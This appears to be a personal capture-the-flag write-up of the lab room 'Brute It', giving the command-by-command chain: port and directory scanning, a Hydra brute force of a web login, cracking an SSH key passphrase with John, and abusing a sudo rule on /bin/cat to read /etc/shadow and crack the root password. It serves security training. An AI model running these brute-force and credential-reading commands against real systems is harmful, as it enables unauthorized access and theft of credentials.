# Brute It – Internal Write-up

Target: 10.113.166.164
Difficulty: Easy
Focus: Brute-force, Hash Cracking, sudo Abuse

## Reconnaissance

nmap to find ports and versions
Command:
nmap -sC -sV -p- 10.113.166.164

dirbuster to find hidden directory
gobuster dir -u http://10.113.166.164/
 -w /usr/share/wordlists/dirb/common.txt
 checked result in web browser.

Source code revealed commentwith username

Failure message:
Username or password invalid

Hydra command:
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.113.166.164 http-post-form "/admin/:user=^USER^&pass=^PASS^:Username or password invalid"
Result:
(redacted)
Login in webapp successful.
Flag and SSH Private Key were on the webapp directly, not hidden. Also username for SSH was given there.
Saved key locally.
Set permissions:
chmod 600 id_rsa

## Cracking Private Keyphrase
Cracking SSH Key Passphrase

ssh2john id_rsa > id_rsa.hash
john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
Result:
Passphrase recovered.
SSH login:
ssh -i id_rsa john@10.113.166.164
User flag found at:
/home/john/user.txt

## Privilege Escalation
Check sudo rights:
sudo -l

Result:
(root) NOPASSWD: /bin/cat

Interpretation:
We can read any file as root.

First objective:
sudo /bin/cat /root/root.txt
Root flag accessible.

Second objective (root password):
to find root password hash
sudo /bin/cat /etc/shadow

Extracted root hash into hash.txt locally to crack it
Crack with John:

john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Result:
(redacted)
Privilege escalation:
su root
Password: (redacted)

Confirmed root access, found all answers and flags.

## Lessons learned
straightforward room with not much hidden. 
Just practice using standard enumeration nmap and dirbuster, 
searching for login possibilities on the webapp and cracking password with hydra after finding username.
After that cracking private keyphrase for SSH to access server. 
Privilege escalation trough /bin/cat which can be run by current user with root's rights (for flags you did not need to actually become root)
